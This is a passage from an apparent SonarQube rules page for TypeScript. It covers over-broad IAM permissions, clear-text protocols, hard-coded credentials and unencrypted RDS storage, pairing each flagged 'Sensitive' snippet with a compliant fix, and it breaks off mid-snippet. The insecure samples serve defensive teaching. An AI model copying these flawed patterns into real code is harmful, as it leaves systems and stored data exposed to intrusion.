to organize or <a href="https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/" rel="nofollow">tag</a>
resources depending on the sensitivity level of data they store or process. Therefore, managing a secure access control is less prone to errors.</p>
<h2>Sensitive Code Example</h2>
<p>The wildcard <code>&#34;*&#34;</code> is specified as the resource for this <code>PolicyStatement</code>. This grants the update permission for all
policies of the account:</p>
<pre>
import { aws_iam as iam } from &#39;aws-cdk-lib&#39;

new iam.PolicyDocument({
    statements: [
        new iam.PolicyStatement({
            effect: iam.Effect.ALLOW,
            actions: [&#34;iam:CreatePolicyVersion&#34;],
            resources: [&#34;*&#34;] // Sensitive
        })
    ]
})
</pre>
<h2>Compliant Solution</h2>
<p>Restrict the update permission to the appropriate subset of policies:</p>
<pre>
import { aws_iam as iam } from &#39;aws-cdk-lib&#39;

new iam.PolicyDocument({
    statements: [
        new iam.PolicyStatement({
            effect: iam.Effect.ALLOW,
            actions: [&#34;iam:CreatePolicyVersion&#34;],
            resources: [&#34;arn:aws:iam:::policy/team1/*&#34;]
        })
    ]
})
</pre>
<h2>Exceptions</h2>
<ul><li> Should not be raised on key policies (when AWS KMS actions are used.) </li><li> Should not be raised on policies not using any resources (if and only if all actions in the policy never require resources.) </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege" rel="nofollow">AWS Documentation</a> - Grant least
  privilege </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5332">
              typescript:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul><li> sensitive data exposure </li><li> traffic redirected to a malicious endpoint </li><li> malware-infected software update or installer </li><li> execution of client-side code </li><li> corruption of critical information </li></ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul><li> bypassing isolation mechanisms </li><li> compromising a component of the network </li><li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li></ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http" rel="nofollow">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169" rel="nofollow">CVE-2019-6169</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327" rel="nofollow">CVE-2019-12327</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065" rel="nofollow">CVE-2019-11065</a> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li><li> Application data transits over an untrusted network. </li><li> Compliance rules require the service to encrypt data in transit. </li><li> Your application renders web pages with a relaxed mixed content policy. </li><li> OS-level protections against clear-text traffic are deactivated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul><li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li><li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li><li> Use <code>https</code> instead of <code>http</code>. </li><li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li></ul>  </li><li> Enable encryption of cloud components communications whenever it is possible. </li><li> Configure your application to block mixed content when rendering web pages. </li><li> If available, enforce OS-level deactivation of all clear-text traffic. </li></ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<pre>
url &#61; &#34;http://example.com&#34;; // Sensitive
url &#61; &#34;ftp://anonymous&#64;example.com&#34;; // Sensitive
url &#61; &#34;telnet://anonymous&#64;example.com&#34;; // Sensitive
</pre>
<p>For <a href="https://nodemailer.com" rel="nofollow">nodemailer</a>:</p>
<pre>
const nodemailer &#61; require(&#34;nodemailer&#34;);
let transporter &#61; nodemailer.createTransport({
  secure: false, // Sensitive
  requireTLS: false // Sensitive
});
</pre>
<pre>
const nodemailer &#61; require(&#34;nodemailer&#34;);
let transporter &#61; nodemailer.createTransport({}); // Sensitive
</pre>
<p>For <a href="https://github.com/mscdex/node-ftp" rel="nofollow">ftp</a>:</p>
<pre>
var Client &#61; require(&#39;ftp&#39;);
var c &#61; new Client();
c.connect({
  &#39;secure&#39;: false // Sensitive
});
</pre>
<p>For <a href="https://github.com/mkozjak/node-telnet-client" rel="nofollow">telnet-client</a>:</p>
<pre>
const Telnet &#61; require(&#39;telnet-client&#39;); // Sensitive
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationLoadBalancer.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationLoadBalancer</a>:</p>
<pre>
import { ApplicationLoadBalancer } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

const alb &#61; new ApplicationLoadBalancer(this, &#39;ALB&#39;, {
  vpc: vpc,
  internetFacing: true
});

alb.addListener(&#39;listener-http-default&#39;, {
  port: 8080,
  open: true
}); // Sensitive

alb.addListener(&#39;listener-http-explicit&#39;, {
  protocol: ApplicationProtocol.HTTP, // Sensitive
  port: 8080,
  open: true
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationListener.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationListener</a>:</p>
<pre>
import { ApplicationListener } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

new ApplicationListener(this, &#39;listener-http-explicit-constructor&#39;, {
  loadBalancer: alb,
  protocol: ApplicationProtocol.HTTP, // Sensitive
  port: 8080,
  open: true
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkLoadBalancer.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkLoadBalancer</a>:</p>
<pre>
import { NetworkLoadBalancer } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

const nlb &#61; new NetworkLoadBalancer(this, &#39;nlb&#39;, {
  vpc: vpc,
  internetFacing: true
});

var listenerNLB &#61; nlb.addListener(&#39;listener-tcp-default&#39;, {
  port: 1234
}); // Sensitive

listenerNLB &#61; nlb.addListener(&#39;listener-tcp-explicit&#39;, {
  protocol: Protocol.TCP, // Sensitive
  port: 1234
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkListener.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkListener</a>:</p>
<pre>
import { NetworkListener } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

new NetworkListener(this, &#39;listener-tcp-explicit-constructor&#39;, {
  loadBalancer: nlb,
  protocol: Protocol.TCP, // Sensitive
  port: 8080
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.CfnListener.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.CfnListener</a>:</p>
<pre>
import { CfnListener } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

new CfnListener(this, &#39;listener-http&#39;, {
  defaultActions: defaultActions,
  loadBalancerArn: alb.loadBalancerArn,
  protocol: &#34;HTTP&#34;, // Sensitive
  port: 80
});

new CfnListener(this, &#39;listener-tcp&#39;, {
  defaultActions: defaultActions,
  loadBalancerArn: alb.loadBalancerArn,
  protocol: &#34;TCP&#34;, // Sensitive
  port: 80
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.CfnLoadBalancer.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancing.CfnLoadBalancer</a>:</p>
<pre>
import { CfnLoadBalancer } from &#39;aws-cdk-lib/aws-elasticloadbalancing&#39;;

new CfnLoadBalancer(this, &#39;elb-tcp&#39;, {
  listeners: [{
    instancePort: &#39;1000&#39;,
    loadBalancerPort: &#39;1000&#39;,
    protocol: &#39;tcp&#39; // Sensitive
  }]
});

new CfnLoadBalancer(this, &#39;elb-http&#39;, {
  listeners: [{
    instancePort: &#39;1000&#39;,
    loadBalancerPort: &#39;1000&#39;,
    protocol: &#39;http&#39; // Sensitive
  }]
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.LoadBalancer.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancing.LoadBalancer</a>:</p>
<pre>
import { LoadBalancer } from &#39;aws-cdk-lib/aws-elasticloadbalancing&#39;;

const loadBalancer &#61; new LoadBalancer(this, &#39;elb-tcp-dict&#39;, {
    vpc,
    internetFacing: true,
    healthCheck: {
    port: 80,
    },
    listeners: [
    {
        externalPort:10000,
        externalProtocol: LoadBalancingProtocol.TCP, // Sensitive
        internalPort:10000
    }]
});

loadBalancer.addListener({
  externalPort:10001,
  externalProtocol:LoadBalancingProtocol.TCP, // Sensitive
  internalPort:10001
});
loadBalancer.addListener({
  externalPort:10002,
  externalProtocol:LoadBalancingProtocol.HTTP, // Sensitive
  internalPort:10002
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticache.CfnReplicationGroup.html" rel="nofollow">aws-cdk-lib.aws-elasticache.CfnReplicationGroup</a>:</p>
<pre>
import { CfnReplicationGroup } from &#39;aws-cdk-lib/aws-elasticache&#39;;

new CfnReplicationGroup(this, &#39;unencrypted-implicit&#39;, {
  replicationGroupDescription: &#39;exampleDescription&#39;
}); // Sensitive

new CfnReplicationGroup(this, &#39;unencrypted-explicit&#39;, {
  replicationGroupDescription: &#39;exampleDescription&#39;,
  transitEncryptionEnabled: false // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.CfnStream.html" rel="nofollow">aws-cdk-lib.aws-kinesis.CfnStream</a>:</p>
<pre>
import { CfnStream } from &#39;aws-cdk-lib/aws-kinesis&#39;;

new CfnStream(this, &#39;cfnstream-implicit-unencrytped&#39;, undefined); // Sensitive

new CfnStream(this, &#39;cfnstream-explicit-unencrytped&#39;, {
  streamEncryption: undefined // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.Stream.html" rel="nofollow">aws-cdk-lib.aws-kinesis.Stream</a>:</p>
<pre>
import { Stream } from &#39;aws-cdk-lib/aws-kinesis&#39;;

new Stream(this, &#39;stream-explicit-unencrypted&#39;, {
  encryption: StreamEncryption.UNENCRYPTED // Sensitive
});
</pre>
<h2>Compliant Solution</h2>
<pre>
url &#61; &#34;https://example.com&#34;;
url &#61; &#34;sftp://anonymous&#64;example.com&#34;;
url &#61; &#34;ssh://anonymous&#64;example.com&#34;;
</pre>
<p>For <a href="https://nodemailer.com" rel="nofollow">nodemailer</a> one of the following options must be set:</p>
<pre>
const nodemailer &#61; require(&#34;nodemailer&#34;);
let transporter &#61; nodemailer.createTransport({
  secure: true,
  requireTLS: true,
  port: 465,
  secured: true
});
</pre>
<p>For <a href="https://github.com/mscdex/node-ftp" rel="nofollow">ftp</a>:</p>
<pre>
var Client &#61; require(&#39;ftp&#39;);
var c &#61; new Client();
c.connect({
  &#39;secure&#39;: true
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationLoadBalancer.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationLoadBalancer</a>:</p>
<pre>
import { ApplicationLoadBalancer } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

const alb &#61; new ApplicationLoadBalancer(this, &#39;ALB&#39;, {
  vpc: vpc,
  internetFacing: true
});

alb.addListener(&#39;listener-https-explicit&#39;, {
  protocol: ApplicationProtocol.HTTPS,
  port: 8080,
  open: true,
  certificates: [certificate]
});

alb.addListener(&#39;listener-https-implicit&#39;, {
  port: 8080,
  open: true,
  certificates: [certificate]
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationListener.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationListener</a>:</p>
<pre>
import { ApplicationListener } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

new ApplicationListener(this, &#39;listener-https-explicit&#39;, {
  loadBalancer: loadBalancer,
  protocol: ApplicationProtocol.HTTPS,
  port: 8080,
  open: true,
  certificates: [certificate]
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkLoadBalancer.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkLoadBalancer</a>:</p>
<pre>
import { NetworkLoadBalancer } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

const nlb &#61; new NetworkLoadBalancer(this, &#39;nlb&#39;, {
  vpc: vpc,
  internetFacing: true
});

nlb.addListener(&#39;listener-tls-explicit&#39;, {
  protocol: Protocol.TLS,
  port: 1234,
  certificates: [certificate]
});

nlb.addListener(&#39;listener-tls-implicit&#39;, {
  port: 1234,
  certificates: [certificate]
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkListener.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkListener</a>:</p>
<pre>
import { NetworkListener } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

new NetworkListener(this, &#39;listener-tls-explicit&#39;, {
  loadBalancer: loadBalancer,
  protocol: Protocol.TLS,
  port: 8080,
  certificates: [certificate]
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.CfnListener.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.CfnListener</a>:</p>
<pre>
import { CfnListener } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

new CfnListener(this, &#39;listener-https&#39;, {
  defaultActions: defaultActions,
  loadBalancerArn: loadBalancerArn,
  protocol: &#34;HTTPS&#34;,
  port: 80
  certificates: [certificate]
});

new CfnListener(this, &#39;listener-tls&#39;, {
  defaultActions: defaultActions,
  loadBalancerArn: loadBalancerArn,
  protocol: &#34;TLS&#34;,
  port: 80
  certificates: [certificate]
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.CfnLoadBalancer.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancing.CfnLoadBalancer</a>:</p>
<pre>
import { CfnLoadBalancer } from &#39;aws-cdk-lib/aws-elasticloadbalancing&#39;;

new CfnLoadBalancer(this, &#39;elb-ssl&#39;, {
  listeners: [{
    instancePort: &#39;1000&#39;,
    loadBalancerPort: &#39;1000&#39;,
    protocol: &#39;ssl&#39;,
    sslCertificateId: sslCertificateId
  }]
});

new CfnLoadBalancer(this, &#39;elb-https&#39;, {
  listeners: [{
    instancePort: &#39;1000&#39;,
    loadBalancerPort: &#39;1000&#39;,
    protocol: &#39;https&#39;,
    sslCertificateId: sslCertificateId
  }]
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.LoadBalancer.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancing.LoadBalancer</a>:</p>
<pre>
import { LoadBalancer, LoadBalancingProtocol } from &#39;aws-cdk-lib/aws-elasticloadbalancing&#39;;

const lb &#61; new LoadBalancer(this, &#39;elb-ssl&#39;, {
  vpc,
  internetFacing: true,
  healthCheck: {
    port: 80,
  },
  listeners: [
    {
      externalPort:10000,
      externalProtocol:LoadBalancingProtocol.SSL,
      internalPort:10000
    }]
});

lb.addListener({
  externalPort:10001,
  externalProtocol:LoadBalancingProtocol.SSL,
  internalPort:10001
});
lb.addListener({
  externalPort:10002,
  externalProtocol:LoadBalancingProtocol.HTTPS,
  internalPort:10002
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticache.CfnReplicationGroup.html" rel="nofollow">aws-cdk-lib.aws-elasticache.CfnReplicationGroup</a>:</p>
<pre>
import { CfnReplicationGroup } from &#39;aws-cdk-lib/aws-elasticache&#39;;

new CfnReplicationGroup(this, &#39;encrypted-explicit&#39;, {
  replicationGroupDescription: &#39;example&#39;,
  transitEncryptionEnabled: true
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.Stream.html" rel="nofollow">aws-cdk-lib.aws-kinesis.Stream</a>:</p>
<pre>
import { Stream } from &#39;aws-cdk-lib/aws-kinesis&#39;;

new Stream(this, &#39;stream-implicit-encrypted&#39;);

new Stream(this, &#39;stream-explicit-encrypted-selfmanaged&#39;, {
  encryption: StreamEncryption.KMS,
  encryptionKey: encryptionKey,
});

new Stream(this, &#39;stream-explicit-encrypted-managed&#39;, {
  encryption: StreamEncryption.MANAGED
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.CfnStream.html" rel="nofollow">aws-cdk-lib.aws-kinesis.CfnStream</a>:</p>
<pre>
import { CfnStream } from &#39;aws-cdk-lib/aws-kinesis&#39;;

new CfnStream(this, &#39;cfnstream-explicit-encrypted&#39;, {
  streamEncryption: {
    encryptionType: encryptionType,
    keyId: encryptionKey.keyId,
  }
});
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html" rel="nofollow">Google, Moving towards more secure web</a> </li><li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/" rel="nofollow">Mozilla, Deprecating non secure http</a> </li><li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html" rel="nofollow">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li><li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html" rel="nofollow">AWS
  Documentation</a> - Stream Encryption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2068">
              typescript:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as &#34;oauthToken&#34;, &#34;secret&#34;, …​</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li><li> Credentials are used in production environments. </li><li> Application re-distribution is required before updating the credentials. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
var mysql &#61; require(&#39;mysql&#39;);

var connection &#61; mysql.createConnection(
{
  host:&#39;localhost&#39;,
  user: &#34;admin&#34;,
  database: &#34;project&#34;,
  password: &#34;mypassword&#34;, // sensitive
  multipleStatements: true
});

connection.connect();
</pre>
<h2>Compliant Solution</h2>
<pre>
var mysql &#61; require(&#39;mysql&#39;);

var connection &#61; mysql.createConnection({
  host: process.env.MYSQL_URL,
  user: process.env.MYSQL_USERNAME,
  password: process.env.MYSQL_PASSWORD,
  database: process.env.MYSQL_DATABASE
});
connection.connect();
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S6303">
              typescript:S6303
            </a>
          </td>
          <td>
            <details>
              <p>Using unencrypted RDS DB resources exposes data to unauthorized access.<br /> This includes database data, logs, automatic backups, read replicas,
snapshots, and cluster metadata.</p>
<p>This situation can occur in a variety of scenarios, such as:</p>
<ul><li> A malicious insider working at the cloud provider gains physical access to the storage device. </li><li> Unknown attackers penetrate the cloud provider’s logical infrastructure and systems. </li></ul>
<p>After a successful intrusion, the underlying applications are exposed to:</p>
<ul><li> theft of intellectual property and/or personal data </li><li> extortion </li><li> denial of services and security bypasses via data corruption or deletion </li></ul>
<p>AWS-managed encryption at rest reduces this risk with a simple switch.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The database contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to enable encryption at rest on any RDS DB resource, regardless of the engine.<br /> In any case, no further maintenance is
required as encryption at rest is fully managed by AWS.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBCluster.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.CfnDBCluster</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

new rds.CfnDBCluster(this, &#39;example&#39;, {
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.CfnDBInstance</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

new rds.CfnDBInstance(this, &#39;example&#39;, {
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseCluster.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.DatabaseCluster</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;
import { aws_ec2 as ec2 } from &#39;aws-cdk-lib&#39;;

declare const vpc: ec2.Vpc;

const cluster &#61; new rds.DatabaseCluster(this, &#39;example&#39;, {
  engine: rds.DatabaseClusterEngine.auroraMysql({ version: rds.AuroraMysqlEngineVersion.VER_2_08_1 }),
  instanceProps: {
    vpcSubnets: {
      subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS,
    },
    vpc,
  },
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

declare const vpc: ec2.Vpc;

new rds.DatabaseClusterFromSnapshot(this, &#39;example&#39;, {
  engine: rds.DatabaseClusterEngine.aurora({ version: rds.AuroraEngineVersion.VER_1_22_2 }),
  instanceProps: {
    vpc,
  },
  snapshotIdentifier: &#39;exampleSnapshot&#39;,
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstance.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.DatabaseInstance</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

declare const vpc: ec2.Vpc;

new rds.DatabaseInstance(this, &#39;example&#39;, {
  engine: rds.DatabaseInstanceEngine.POSTGRES,
  vpc,
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

declare const sourceInstance: rds.DatabaseInstance;

new rds.DatabaseInstanceReadReplica(this, &#39;example&#39;, {
  sourceDatabaseInstance: sourceInstance,
  instanceType: ec2.InstanceType.of(ec2.InstanceClass.BURSTABLE2, ec2.InstanceSize.LARGE),
  vpc,
  storageEncrypted: false, // Sensitive
});
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBCluster.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.CfnDBCluster</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

new rds.CfnDBCluster(this, &#39;example&#39;, {
  storageEncrypted: true,
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.CfnDBInstance</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

new rds.CfnDBInstance(this, &#39;example&#39;, {
  storageEncrypted: true,
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseCluster.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.DatabaseCluster</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

declare const vpc: ec2.Vpc;

const cluster &#61; new rds.DatabaseCluster(this, &#39;example&#39;, {
